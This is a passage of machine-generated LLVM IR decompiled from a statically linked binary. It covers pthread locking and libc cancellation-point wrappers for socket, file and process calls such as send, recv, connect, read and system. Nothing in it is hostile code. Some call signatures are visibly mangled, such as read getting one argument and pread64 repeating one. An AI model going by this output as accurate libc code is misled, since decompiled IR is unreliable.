  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r4, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg2, i32* @r7, align 4
  %v1_1eb18 = call i32 @__pthread_acquire(i32 add (i32 ptrtoint (i32* @global_var_9704.1317 to i32), i32 ptrtoint (i32* @global_var_44990.1184 to i32)))
  store i32 38656, i32* %r2.global-to-local, align 4
  %v0_1eb20 = load i32, i32* @r4, align 4
  %v2_1eb20 = add i32 %v0_1eb20, 38656
  %v3_1eb20 = inttoptr i32 %v2_1eb20 to i32*
  %v4_1eb20 = load i32, i32* %v3_1eb20, align 4
  %v2_1eb24 = icmp eq i32 %v4_1eb20, 0
  store i32 %v4_1eb20, i32* @r6, align 4
  br i1 %v2_1eb24, label %.thread3, label %.thread2

.thread2:                                         ; preds = %entry
  %v2_1eb2c = inttoptr i32 %v4_1eb20 to i32*
  %v3_1eb2c = load i32, i32* %v2_1eb2c, align 4
  store i32 %v3_1eb2c, i32* %r3.global-to-local, align 4
  store i32 %v3_1eb2c, i32* %v3_1eb20, align 4
  %v1_1eb40.pre = load i32, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %entry, %.thread2
  %v1_1eb40 = phi i32 [ %v1_1eb40.pre, %.thread2 ], [ %v0_1eb20, %entry ]
  store i32 ptrtoint (i32* @global_var_9704.1317 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_1eb40 = add i32 %v1_1eb40, ptrtoint (i32* @global_var_9704.1317 to i32)
  %v4_1eb40 = inttoptr i32 %v3_1eb40 to i32*
  store i32 0, i32* %v4_1eb40, align 4
  %v0_1eb44 = load i32, i32* @r6, align 4
  %v1_1eb44 = load i32, i32* %r2.global-to-local, align 4
  %v9_1eb44 = icmp eq i32 %v0_1eb44, %v1_1eb44
  br i1 %v9_1eb44, label %dec_label_pc_1eb4c, label %dec_label_pc_1eb6c

dec_label_pc_1eb4c:                               ; preds = %.thread3
  %v1_1eb50 = call i32 @malloc(i32 12)
  store i32 %v1_1eb50, i32* @r6, align 4
  %v2_1eb54 = icmp eq i32 %v1_1eb50, 0
  br i1 %v2_1eb54, label %dec_label_pc_1eb5c, label %dec_label_pc_1eb6c

dec_label_pc_1eb5c:                               ; preds = %dec_label_pc_1eb4c
  %v0_1eb5c = load i32, i32* @r5, align 4
  %v0_1eb60 = load i32, i32* @r7, align 4
  %v2_1eb64 = inttoptr i32 %v0_1eb5c to i32*
  %v3_1eb64 = call i32 @__pthread_alt_lock(i32* %v2_1eb64, i32 %v0_1eb60)
  br label %dec_label_pc_1ebfc

dec_label_pc_1eb6c:                               ; preds = %dec_label_pc_1eb4c, %.thread3
  %v0_1eb6c = load i32, i32* @r5, align 4
  %v1_1eb6c = add i32 %v0_1eb6c, 4
  %v1_1eb70 = call i32 @__pthread_acquire(i32 %v1_1eb6c)
  %v0_1eb74 = load i32, i32* @r5, align 4
  %v1_1eb74 = inttoptr i32 %v0_1eb74 to i32*
  %v2_1eb74 = load i32, i32* %v1_1eb74, align 4
  store i32 %v2_1eb74, i32* @r4, align 4
  %v2_1eb78 = icmp eq i32 %v2_1eb74, 0
  br i1 %v2_1eb78, label %.thread6, label %dec_label_pc_1eb8c

.thread6:                                         ; preds = %dec_label_pc_1eb6c
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %v1_1eb74, align 4
  br label %dec_label_pc_1ebb0

dec_label_pc_1eb8c:                               ; preds = %dec_label_pc_1eb6c
  %v0_1eb8c = load i32, i32* @r7, align 4
  %v2_1eb8c = icmp eq i32 %v0_1eb8c, 0
  br i1 %v2_1eb8c, label %dec_label_pc_1eb94, label %dec_label_pc_1eb9c

dec_label_pc_1eb94:                               ; preds = %dec_label_pc_1eb8c
  %v0_1eb94 = call i32 @_thread_self.2()
  store i32 %v0_1eb94, i32* @r7, align 4
  br label %dec_label_pc_1eb9c

dec_label_pc_1eb9c:                               ; preds = %dec_label_pc_1eb8c, %dec_label_pc_1eb94
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1eba0 = load i32, i32* @r6, align 4
  %v2_1eba0 = add i32 %v1_1eba0, 8
  %v3_1eba0 = inttoptr i32 %v2_1eba0 to i32*
  store i32 0, i32* %v3_1eba0, align 4
  %v0_1eba4 = load i32, i32* @r6, align 4
  %v1_1eba4 = inttoptr i32 %v0_1eba4 to i32*
  %v2_1eba4 = load i32, i32* @r4, align 4
  store i32 %v2_1eba4, i32* %v1_1eba4, align 4
  %v3_1eba4 = add i32 %v0_1eba4, 4
  %v4_1eba4 = inttoptr i32 %v3_1eba4 to i32*
  %v5_1eba4 = load i32, i32* @r7, align 4
  store i32 %v5_1eba4, i32* %v4_1eba4, align 4
  %v0_1eba8 = load i32, i32* @r6, align 4
  %v1_1eba8 = load i32, i32* @r5, align 4
  %v2_1eba8 = inttoptr i32 %v1_1eba8 to i32*
  store i32 %v0_1eba8, i32* %v2_1eba8, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1ebb0

dec_label_pc_1ebb0:                               ; preds = %.thread6, %dec_label_pc_1eb9c
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1ebb4 = load i32, i32* @r5, align 4
  %v2_1ebb4 = add i32 %v1_1ebb4, 4
  %v3_1ebb4 = inttoptr i32 %v2_1ebb4 to i32*
  store i32 0, i32* %v3_1ebb4, align 4
  %v0_1ebb8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1ebb8 = load i32, i32* %r3.global-to-local, align 4
  %v9_1ebb8 = icmp eq i32 %v0_1ebb8, %v1_1ebb8
  br i1 %v9_1ebb8, label %dec_label_pc_1ebf0, label %dec_label_pc_1ebc0

dec_label_pc_1ebc0:                               ; preds = %dec_label_pc_1ebb0
  %v0_1ebc0 = load i32, i32* @r8, align 4
  %v0_1ebc4 = load i32, i32* @r7, align 4
  %v2_1ebc8 = inttoptr i32 %v0_1ebc0 to i32*
  %v3_1ebc8 = call i32 @__pthread_timedsuspend_new(i32 %v0_1ebc4, i32* %v2_1ebc8)
  %v2_1ebcc = icmp eq i32 %v3_1ebc8, 0
  br i1 %v2_1ebcc, label %dec_label_pc_1ebe8, label %dec_label_pc_1ebf0

dec_label_pc_1ebe8:                               ; preds = %dec_label_pc_1ebc0
  %v0_1ebd8 = load i32, i32* @r6, align 4
  %v1_1ebd8 = add i32 %v0_1ebd8, 8
  store i32 %v1_1ebd8, i32* %r3.global-to-local, align 4
  %v0_1ebe8 = load i32, i32* @r7, align 4
  store i32 %v0_1ebe8, i32* @r0, align 4
  %v1_1ebec = call i32 @_suspend(i32 %v0_1ebe8)
  br label %dec_label_pc_1ebf0

dec_label_pc_1ebf0:                               ; preds = %dec_label_pc_1ebc0, %dec_label_pc_1ebb0, %dec_label_pc_1ebe8
  %v0_1ebf0 = load i32, i32* @r6, align 4
  store i32 %v0_1ebf0, i32* @r0, align 4
  %v0_1ebf4 = call i32 @wait_node_free()
  br label %dec_label_pc_1ebfc

dec_label_pc_1ebfc:                               ; preds = %dec_label_pc_1ebf0, %dec_label_pc_1eb5c
  ret i32 1

; uselistorder directives
  uselistorder i32 %v4_1eb20, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32 ()* @wait_node_free, { 1, 0 }
  uselistorder i32 ()* @_thread_self.2, { 1, 0 }
  uselistorder i32 (i32)* @__pthread_acquire, { 5, 4, 2, 1, 0, 6, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_9704.1317 to i32), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1ebf0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1ebb0, { 1, 0 }
  uselistorder label %dec_label_pc_1eb9c, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @epoll_pwait(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_1ec24 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @r5, align 4
  %v3_1ec30 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1ec24)
  %v0_1ec38 = load i32, i32* @r4, align 4
  %v0_1ec3c = load i32, i32* @r5, align 4
  %v0_1ec44 = load i32, i32* @r7, align 4
  %v5_1ec4c = call i32 @__libc_epoll_pwait(i32 %v0_1ec44, i32 %v0_1ec38, i32 %v0_1ec3c, i32 %arg4, i32 %arg5)
  store i32 %v5_1ec4c, i32* @r4, align 4
  %v3_1ec58 = load i32, i32* %stack_var_-28, align 4
  %v2_1ec5c = trunc i32 %v3_1ec58 to i8
  %v3_1ec5c = call i32 @__GI_pthread_setcanceltype(i8 %v2_1ec5c, i32 0)
  %v0_1ec60 = load i32, i32* @r4, align 4
  ret i32 %v0_1ec60
}

define i32 @epoll_wait(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg4, i32* @r7, align 4
  %v2_1ec88 = ptrtoint i32* %stack_var_-28 to i32
  %v3_1ec90 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1ec88)
  %v0_1ec94 = load i32, i32* @r5, align 4
  %v0_1ec9c = load i32, i32* @r7, align 4
  %v0_1eca0 = load i32, i32* @r4, align 4
  %v4_1eca4 = call i32 @__libc_epoll_wait(i32 %v0_1eca0, i32 %v0_1ec94, i32 %arg3, i32 %v0_1ec9c)
  store i32 %v4_1eca4, i32* @r4, align 4
  %v3_1ecb0 = load i32, i32* %stack_var_-28, align 4
  %v2_1ecb4 = trunc i32 %v3_1ecb0 to i8
  %v3_1ecb4 = call i32 @__GI_pthread_setcanceltype(i8 %v2_1ecb4, i32 0)
  %v0_1ecb8 = load i32, i32* @r4, align 4
  ret i32 %v0_1ecb8
}

define i32 @sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v3_1ecc8 = load i32, i32* @r4, align 4
  %v6_1ecc8 = load i32, i32* @r5, align 4
  %v12_1ecc8 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_1ecdc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @r5, align 4
  %v3_1ece8 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1ecdc)
  %v0_1ecf8 = load i32, i32* @r4, align 4
  %v0_1ecfc = load i32, i32* @r5, align 4
  %v0_1ed04 = load i32, i32* @r7, align 4
  %v6_1ed0c = call i32 @__libc_sendto(i32 %v0_1ed04, i32 %v0_1ecf8, i32 %v0_1ecfc, i32 %arg4, i32 %arg5, i32 %arg6)
  store i32 %v6_1ed0c, i32* @r4, align 4
  %v3_1ed18 = load i32, i32* %stack_var_-28, align 4
  %v2_1ed1c = trunc i32 %v3_1ed18 to i8
  %v3_1ed1c = call i32 @__GI_pthread_setcanceltype(i8 %v2_1ed1c, i32 0)
  %v0_1ed20 = load i32, i32* @r4, align 4
  store i32 %v3_1ecc8, i32* @r4, align 4
  store i32 %v6_1ecc8, i32* @r5, align 4
  store i32 %v12_1ecc8, i32* @r7, align 4
  ret i32 %v0_1ed20
}

define i32 @sendmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  %v2_1ed44 = ptrtoint i32* %stack_var_-20 to i32
  %v3_1ed4c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1ed44)
  %v0_1ed50 = load i32, i32* @r5, align 4
  %v0_1ed58 = load i32, i32* @r4, align 4
  %v3_1ed5c = call i32 @__libc_sendmsg(i32 %v0_1ed58, i32 %v0_1ed50, i32 %arg3)
  store i32 %v3_1ed5c, i32* @r4, align 4
  %v3_1ed68 = load i32, i32* %stack_var_-20, align 4
  %v2_1ed6c = trunc i32 %v3_1ed68 to i8
  %v3_1ed6c = call i32 @__GI_pthread_setcanceltype(i8 %v2_1ed6c, i32 0)
  %v0_1ed70 = load i32, i32* @r4, align 4
  ret i32 %v0_1ed70
}

define i32 @send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v3_1ed80 = load i32, i32* @r4, align 4
  %v6_1ed80 = load i32, i32* @r5, align 4
  %v12_1ed80 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg4, i32* @r7, align 4
  %v2_1ed98 = ptrtoint i32* %stack_var_-28 to i32
  %v3_1eda0 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1ed98)
  %v0_1eda4 = load i32, i32* @r5, align 4
  %v0_1edac = load i32, i32* @r7, align 4
  %v0_1edb0 = load i32, i32* @r4, align 4
  %v4_1edb4 = call i32 @__libc_send(i32 %v0_1edb0, i32 %v0_1eda4, i32 %arg3, i32 %v0_1edac)
  store i32 %v4_1edb4, i32* @r4, align 4
  %v3_1edc0 = load i32, i32* %stack_var_-28, align 4
  %v2_1edc4 = trunc i32 %v3_1edc0 to i8
  %v3_1edc4 = call i32 @__GI_pthread_setcanceltype(i8 %v2_1edc4, i32 0)
  %v0_1edc8 = load i32, i32* @r4, align 4
  store i32 %v3_1ed80, i32* @r4, align 4
  store i32 %v6_1ed80, i32* @r5, align 4
  store i32 %v12_1ed80, i32* @r7, align 4
  ret i32 %v0_1edc8
}

define i32 @recvmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  %v2_1edec = ptrtoint i32* %stack_var_-20 to i32
  %v3_1edf4 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1edec)
  %v0_1edf8 = load i32, i32* @r5, align 4
  %v0_1ee00 = load i32, i32* @r4, align 4
  %v3_1ee04 = call i32 @__libc_recvmsg(i32 %v0_1ee00, i32 %v0_1edf8, i32 %arg3)
  store i32 %v3_1ee04, i32* @r4, align 4
  %v3_1ee10 = load i32, i32* %stack_var_-20, align 4
  %v2_1ee14 = trunc i32 %v3_1ee10 to i8
  %v3_1ee14 = call i32 @__GI_pthread_setcanceltype(i8 %v2_1ee14, i32 0)
  %v0_1ee18 = load i32, i32* @r4, align 4
  ret i32 %v0_1ee18
}

define i32 @recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_1ee3c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @r5, align 4
  %v3_1ee48 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1ee3c)
  %v0_1ee58 = load i32, i32* @r4, align 4
  %v0_1ee5c = load i32, i32* @r5, align 4
  %v0_1ee64 = load i32, i32* @r7, align 4
  %v6_1ee6c = call i32 @__libc_recvfrom(i32 %v0_1ee64, i32 %v0_1ee58, i32 %v0_1ee5c, i32 %arg4, i32 %arg5, i32 %arg6)
  store i32 %v6_1ee6c, i32* @r4, align 4
  %v3_1ee78 = load i32, i32* %stack_var_-28, align 4
  %v2_1ee7c = trunc i32 %v3_1ee78 to i8
  %v3_1ee7c = call i32 @__GI_pthread_setcanceltype(i8 %v2_1ee7c, i32 0)
  %v0_1ee80 = load i32, i32* @r4, align 4
  ret i32 %v0_1ee80
}

define i32 @recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v3_1ee90 = load i32, i32* @r4, align 4
  %v6_1ee90 = load i32, i32* @r5, align 4
  %v12_1ee90 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg4, i32* @r7, align 4
  %v2_1eea8 = ptrtoint i32* %stack_var_-28 to i32
  %v3_1eeb0 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1eea8)
  %v0_1eeb4 = load i32, i32* @r5, align 4
  %v0_1eebc = load i32, i32* @r7, align 4
  %v0_1eec0 = load i32, i32* @r4, align 4
  %v4_1eec4 = call i32 @__libc_recv(i32 %v0_1eec0, i32 %v0_1eeb4, i32 %arg3, i32 %v0_1eebc)
  store i32 %v4_1eec4, i32* @r4, align 4
  %v3_1eed0 = load i32, i32* %stack_var_-28, align 4
  %v2_1eed4 = trunc i32 %v3_1eed0 to i8
  %v3_1eed4 = call i32 @__GI_pthread_setcanceltype(i8 %v2_1eed4, i32 0)
  %v0_1eed8 = load i32, i32* @r4, align 4
  store i32 %v3_1ee90, i32* @r4, align 4
  store i32 %v6_1ee90, i32* @r5, align 4
  store i32 %v12_1ee90, i32* @r7, align 4
  ret i32 %v0_1eed8
}

define i32 @connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_1eee8 = load i32, i32* @r4, align 4
  %v6_1eee8 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  %v2_1eefc = ptrtoint i32* %stack_var_-20 to i32
  %v3_1ef04 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1eefc)
  %v0_1ef08 = load i32, i32* @r5, align 4
  %v0_1ef10 = load i32, i32* @r4, align 4
  %v3_1ef14 = call i32 @__libc_connect(i32 %v0_1ef10, i32 %v0_1ef08, i32 %arg3)
  store i32 %v3_1ef14, i32* @r4, align 4
  %v3_1ef20 = load i32, i32* %stack_var_-20, align 4
  %v2_1ef24 = trunc i32 %v3_1ef20 to i8
  %v3_1ef24 = call i32 @__GI_pthread_setcanceltype(i8 %v2_1ef24, i32 0)
  %v0_1ef28 = load i32, i32* @r4, align 4
  store i32 %v3_1eee8, i32* @r4, align 4
  store i32 %v6_1eee8, i32* @r5, align 4
  ret i32 %v0_1ef28
}

define i32 @accept(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_1ef38 = load i32, i32* @r4, align 4
  %v6_1ef38 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  %v2_1ef4c = ptrtoint i32* %stack_var_-20 to i32
  %v3_1ef54 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1ef4c)
  %v0_1ef58 = load i32, i32* @r5, align 4
  %v0_1ef60 = load i32, i32* @r4, align 4
  %v3_1ef64 = call i32 @__libc_accept(i32 %v0_1ef60, i32 %v0_1ef58, i32 %arg3)
  store i32 %v3_1ef64, i32* @r4, align 4
  %v3_1ef70 = load i32, i32* %stack_var_-20, align 4
  %v2_1ef74 = trunc i32 %v3_1ef70 to i8
  %v3_1ef74 = call i32 @__GI_pthread_setcanceltype(i8 %v2_1ef74, i32 0)
  %v0_1ef78 = load i32, i32* @r4, align 4
  store i32 %v3_1ef38, i32* @r4, align 4
  store i32 %v6_1ef38, i32* @r5, align 4
  ret i32 %v0_1ef78
}

define i32 @write(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_1ef88 = load i32, i32* @r4, align 4
  %v6_1ef88 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  %v2_1ef9c = ptrtoint i32* %stack_var_-20 to i32
  %v3_1efa4 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1ef9c)
  %v0_1efa8 = load i32, i32* @r5, align 4
  %v0_1efb0 = load i32, i32* @r4, align 4
  %v2_1efb4 = call i32 @__GI_write(i32 %v0_1efb0, i32 %v0_1efa8)
  store i32 %v2_1efb4, i32* @r4, align 4
  %v3_1efc0 = load i32, i32* %stack_var_-20, align 4
  %v2_1efc4 = trunc i32 %v3_1efc0 to i8
  %v3_1efc4 = call i32 @__GI_pthread_setcanceltype(i8 %v2_1efc4, i32 0)
  %v0_1efc8 = load i32, i32* @r4, align 4
  store i32 %v3_1ef88, i32* @r4, align 4
  store i32 %v6_1ef88, i32* @r5, align 4
  ret i32 %v0_1efc8
}

define i32 @waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_1efd8 = load i32, i32* @r4, align 4
  %v6_1efd8 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  %v2_1efec = ptrtoint i32* %stack_var_-20 to i32
  %v3_1eff4 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1efec)
  %v0_1eff8 = load i32, i32* @r5, align 4
  store i32 %v0_1eff8, i32* @r1, align 4
  %v0_1f000 = load i32, i32* @r4, align 4
  store i32 %v0_1f000, i32* @r0, align 4
  %v3_1f004 = call i32 @__libc_waitpid(i32 %v0_1f000, i32 %v0_1eff8, i32 %arg3)
  store i32 %v3_1f004, i32* @r4, align 4
  %v3_1f010 = load i32, i32* %stack_var_-20, align 4
  %v2_1f014 = trunc i32 %v3_1f010 to i8
  %v3_1f014 = call i32 @__GI_pthread_setcanceltype(i8 %v2_1f014, i32 0)
  %v0_1f018 = load i32, i32* @r4, align 4
  store i32 %v3_1efd8, i32* @r4, align 4
  store i32 %v6_1efd8, i32* @r5, align 4
  ret i32 %v0_1f018
}

define i32 @wait(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_1f030 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %arg1, i32* @r4, align 4
  %v3_1f03c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1f030)
  %v0_1f040 = load i32, i32* @r4, align 4
  %v1_1f044 = call i32 @__libc_wait(i32 %v0_1f040)
  store i32 %v1_1f044, i32* @r4, align 4
  %v3_1f050 = load i32, i32* %stack_var_-12, align 4
  %v2_1f054 = trunc i32 %v3_1f050 to i8
  %v3_1f054 = call i32 @__GI_pthread_setcanceltype(i8 %v2_1f054, i32 0)
  %v0_1f058 = load i32, i32* @r4, align 4
  ret i32 %v0_1f058
}

define i32 @tcdrain(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_1f070 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %arg1, i32* @r4, align 4
  %v3_1f07c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1f070)
  %v0_1f080 = load i32, i32* @r4, align 4
  %v1_1f084 = call i32 @__libc_tcdrain(i32 %v0_1f080)
  store i32 %v1_1f084, i32* @r4, align 4
  %v3_1f090 = load i32, i32* %stack_var_-12, align 4
  %v2_1f094 = trunc i32 %v3_1f090 to i8
  %v3_1f094 = call i32 @__GI_pthread_setcanceltype(i8 %v2_1f094, i32 0)
  %v0_1f098 = load i32, i32* @r4, align 4
  ret i32 %v0_1f098
}

define i32 @system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_1f0a8 = load i32, i32* @r4, align 4
  %v2_1f0b0 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %arg1, i32* @r4, align 4
  %v3_1f0bc = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1f0b0)
  %v0_1f0c0 = load i32, i32* @r4, align 4
  %v1_1f0c4 = call i32 @__libc_system(i32 %v0_1f0c0)
  store i32 %v1_1f0c4, i32* @r4, align 4
  %v3_1f0d0 = load i32, i32* %stack_var_-12, align 4
  %v2_1f0d4 = trunc i32 %v3_1f0d0 to i8
  %v3_1f0d4 = call i32 @__GI_pthread_setcanceltype(i8 %v2_1f0d4, i32 0)
  %v0_1f0d8 = load i32, i32* @r4, align 4
  store i32 %v3_1f0a8, i32* @r4, align 4
  ret i32 %v0_1f0d8
}

define i32 @read(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_1f0e8 = load i32, i32* @r4, align 4
  %v6_1f0e8 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  %v2_1f0fc = ptrtoint i32* %stack_var_-20 to i32
  %v3_1f104 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1f0fc)
  %v0_1f110 = load i32, i32* @r4, align 4
  %v1_1f114 = call i32 @__GI_read(i32 %v0_1f110)
  store i32 %v1_1f114, i32* @r4, align 4
  %v3_1f120 = load i32, i32* %stack_var_-20, align 4
  %v2_1f124 = trunc i32 %v3_1f120 to i8
  %v3_1f124 = call i32 @__GI_pthread_setcanceltype(i8 %v2_1f124, i32 0)
  %v0_1f128 = load i32, i32* @r4, align 4
  store i32 %v3_1f0e8, i32* @r4, align 4
  store i32 %v6_1f0e8, i32* @r5, align 4
  ret i32 %v0_1f128
}

define i32 @pwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg4, i32* @r7, align 4
  %v2_1f150 = ptrtoint i32* %stack_var_-28 to i32
  %v3_1f158 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1f150)
  %v0_1f15c = load i32, i32* @r5, align 4
  store i32 %v0_1f15c, i32* @r1, align 4
  %v0_1f160 = load i32, i32* @r6, align 4
  store i32 %v0_1f160, i32* @r2, align 4
  %v0_1f164 = load i32, i32* @r7, align 4
  store i32 %v0_1f164, i32* @r3, align 4
  %v0_1f168 = load i32, i32* @r4, align 4
  store i32 %v0_1f168, i32* @r0, align 4
  %v4_1f16c = call i32 @__libc_pwrite(i32 %v0_1f168, i32 %v0_1f15c, i32 %v0_1f160, i32 %v0_1f164)
  store i32 %v4_1f16c, i32* @r4, align 4
  %v3_1f178 = load i32, i32* %stack_var_-28, align 4
  %v2_1f17c = trunc i32 %v3_1f178 to i8
  %v3_1f17c = call i32 @__GI_pthread_setcanceltype(i8 %v2_1f17c, i32 0)
  %v0_1f180 = load i32, i32* @r4, align 4
  ret i32 %v0_1f180
}

define i32 @pread64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_1f1a4 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg3, i32* @r5, align 4
  %v3_1f1ac = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1f1a4)
  %v0_1f1b0 = load i32, i32* @r4, align 4
  store i32 %v0_1f1b0, i32* @r1, align 4
  store i32 %arg5, i32* @r4, align 4
  %v0_1f1bc = load i32, i32* @r5, align 4
  store i32 %v0_1f1bc, i32* @r2, align 4
  %v0_1f1c0 = load i32, i32* @r6, align 4
  store i32 %v0_1f1c0, i32* @r0, align 4
  %v6_1f1c8 = call i32 @__libc_pread64(i32 %v0_1f1c0, i32 %v0_1f1b0, i32 %v0_1f1bc, i32 %arg4, i32 %arg4, i32 %arg5)
  store i32 %v6_1f1c8, i32* @r4, align 4
  %v3_1f1d4 = load i32, i32* %stack_var_-20, align 4
  %v2_1f1d8 = trunc i32 %v3_1f1d4 to i8
  %v3_1f1d8 = call i32 @__GI_pthread_setcanceltype(i8 %v2_1f1d8, i32 0)
  %v0_1f1dc = load i32, i32* @r4, align 4
  ret i32 %v0_1f1dc
}

define i32 @pread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg4, i32* @r7, align 4
  %v2_1f204 = ptrtoint i32* %stack_var_-28 to i32
  %v3_1f20c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1f204)
  %v0_1f210 = load i32, i32* @r5, align 4
  store i32 %v0_1f210, i32* @r1, align 4
  %v0_1f214 = load i32, i32* @r6, align 4
  store i32 %v0_1f214, i32* @r2, align 4
  %v0_1f218 = load i32, i32* @r7, align 4
  store i32 %v0_1f218, i32* @r3, align 4
  %v0_1f21c = load i32, i32* @r4, align 4
  store i32 %v0_1f21c, i32* @r0, align 4
  %v4_1f220 = call i32 @__libc_pread(i32 %v0_1f21c, i32 %v0_1f210, i32 %v0_1f214, i32 %v0_1f218)
  store i32 %v4_1f220, i32* @r4, align 4
  %v3_1f22c = load i32, i32* %stack_var_-28, align 4
  %v2_1f230 = trunc i32 %v3_1f22c to i8
  %v3_1f230 = call i32 @__GI_pthread_setcanceltype(i8 %v2_1f230, i32 0)
  %v0_1f234 = load i32, i32* @r4, align 4
  ret i32 %v0_1f234
}

define i32 @pause() local_unnamed_addr {
entry:
